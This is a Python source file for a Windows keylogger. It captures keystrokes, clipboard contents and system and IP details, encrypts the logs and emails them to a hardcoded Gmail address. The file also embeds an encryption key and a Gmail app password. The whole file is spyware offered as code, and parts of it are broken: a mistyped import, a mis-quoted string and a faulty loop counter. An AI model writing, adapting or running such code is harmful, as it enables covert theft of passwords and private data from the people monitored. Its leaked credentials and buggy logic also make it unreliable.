# Libraries

import yagmail
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fern
import getpass
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information = "system_information.txt"
clipboard_data = "clipboard_information.txt"

keys_information_e = "e_key_log.txt"
system_information_e = "e_system_information.txt"
clipboard_data_e = "e_clipboard_information.txt"

key = "4EgEVYCrwdqIbGMTbObeCga05-TjVaDMjwEFTW6yjq0="
toaddr = "anshkpatel15@gmail.com"

file_path = "C:\\Users\\ACER\\Desktop\\Python\\Random Projects\\KeyLogger\\project"
extend = "\\"
file_merge = file_path + extend

# mail part done
def send_email(filename, attachment, toaddr):
    user = 'user123@gmail.com'
    app_password = 'wzppuvkuikkpwihk'
    to = 'anshkpatel15@gmail.com'

    subject = 'Log File'
    content = ["Body_of_the_mail", 'key_log.txt']

    with yagmail.SMTP(user, app_password) as yag:
        yag.send(to, subject, content)
        print('Sent email successfully')

def computer_information():
    with open(file_path + extend + keys_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipfy.org").text
            f.write("Public IP Address: " + public_ip)
        except Exception:
            f.write(" Public IP Address not accessible (most likely max query)" + "\n")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + '\n');

def copy_clipboard():
    with open(file_path + extend + clipboard_data, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("ClipbBoard Data:  \n + pasted_data")

        except:
            f.write("Clipboard could not be copied")
count = 0
keys = []

# key logging part done`
def on_press(key):
 global keys, count

 print(key)
 keys.append(key)
 count += 1

 if count >= 1:
   count = 0
   write_file(keys)
   keys =[]

def write_file(keys):
 with open(file_path + extend + keys_information, "a") as f:
  for key in keys:
   k = str(key).replace("'","")
   if k.find("space") > 0:
     f.write('\n')
     f.close()
   elif k.find("Key") == -1:
     f.write(k)
     f.close

def on_release(key):
 if key == Key.esc:
  return False

with Listener(on_press=on_press, on_release = on_release) as listener:
 listener.join()

computer_information()
copy_clipboard()

files_to_encrypt = [file_merge + system_information, file_merge + clipboard_data, file_merge + keys_information]
encrypted_file_names =[file_merge + system_information_e, file_merge + clipboard_data_e, file_merge + keys_information_e]

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data =f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
    count += 20

time.sleep(120)